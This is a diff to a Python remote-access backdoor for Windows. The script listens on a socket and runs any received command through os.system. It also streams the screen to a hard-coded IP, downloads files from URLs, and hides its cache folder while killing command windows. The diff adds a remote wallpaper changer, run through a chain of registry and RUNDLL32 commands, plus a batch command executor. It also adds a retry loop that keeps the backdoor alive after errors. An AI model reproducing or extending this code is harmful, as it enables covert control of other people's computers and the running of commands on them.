@@ -10,7 +10,7 @@ def getFileName():                              return os.path.basename(__file__
 def getNameDir(data):                           return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
 
 def supDir(data):                               shutil.rmtree(data)
-    
+
 def downloadFileGithub(file_url, data=".zip"):
     with open(data,"wb") as zip	: 
         for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
@@ -28,7 +28,7 @@ def unzipfile(file=".zip"):
 def sortNameFile(data):
     from os.path import isfile, join
     return [f for f in os.listdir(data) if isfile(join(data, f))]
-    
+
 def moveFileFromDir(data, file):
     if type(file)==str:
         file = file.split()
@@ -58,7 +58,7 @@ def receive():
         return data.decode()
     except:
         return "left"
-    
+
 def terminal(command):
     os.system(command)
 
@@ -90,10 +90,25 @@ def screen():
     sender = ScreenShareClient(ipScreen, 22224)
     sender.start_stream()
 
+def wallpaper(data):
+    importImg(data)
+    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True §!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True§!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
+    
+def severalcmd(data, temp=0.05):
+    datalist = data.split("§!§")
+    for i in datalist:
+        print(i)
+        terminal(i)
+        time.sleep(temp)
+
+def importImg(data):
+    import urllib.request
+    print(data)
+    urllib.request.urlretrieve(data, "Image.jpg")
 
 def execute(data):
-    start = time.time()
     global run, sortir, ossys
+    datalist = data.split()
     if data == "die":
         run = False
     elif data[0:2] == "cd":
@@ -119,44 +134,55 @@ def execute(data):
         scripter.speed_write(data[5:len(data)])
     elif data == "test":
         print("test")
+    elif datalist[0] == "severalcmd":
+        datalist.pop(0)
+        data = " ".join(datalist)
+        severalcmd(data)
+    elif datalist[0] == "wallpaper":
+        datalist.pop(0)
+        data = " ".join(datalist)
+        wallpaper(data)
     else:
         terminal(data)
 
 run, ossys = True, False
 while run == True:
-    sortir, ipScreen, port = False, "172.17.1.214", 22228
-    
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect((ipScreen, 22223))
-    ip = s.getsockname()[0]
-    s.close()
-    
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.settimeout(120)
-    if ossys == True:
-        print("reload")
-        os.system(getFileName())
-        exit()
-    server.bind((ip, port))
-    server.listen()
-    
-    print("lancement")
-    pycache = (subprocess.getoutput("cd "+getpath()+" & dir /A:H /B")).split()
-    temp = 0
-    for i in range(len(pycache)):
-        if pycache[i-1] == "__pycache__":
-            temp = 1
-    if temp == 0:
-        try:
-            subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
-        except:
-            pass
     try:
-        (client, address) = server.accept()
+        sortir, ipScreen, port = False, "172.17.1.214", 22228
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((ipScreen, 22223))
+        ip = s.getsockname()[0]
+        s.close()
+        
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.settimeout(120)
+        if ossys == True:
+            print("reload")
+            os.system(getFileName())
+            exit()
+        server.bind((ip, port))
+        server.listen()
+        
+        print("lancement")
+        pycache = (subprocess.getoutput("cd "+getpath()+" & dir /A:H /B")).split()
+        temp = 0
+        for i in range(len(pycache)):
+            if pycache[i-1] == "__pycache__":
+                temp = 1
+        if temp == 0:
+            try:
+                subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
+            except:
+                pass
+        try:
+            (client, address) = server.accept()
+        except:
+            sortir = True
+        print("connect")
+    
+        while sortir == False and run == True:
+            execute(receive())
     except:
-        sortir = True
-    print("connect")
-
-    while sortir == False and run == True:
-        execute(receive())
+        time.sleep(20)
 exit()
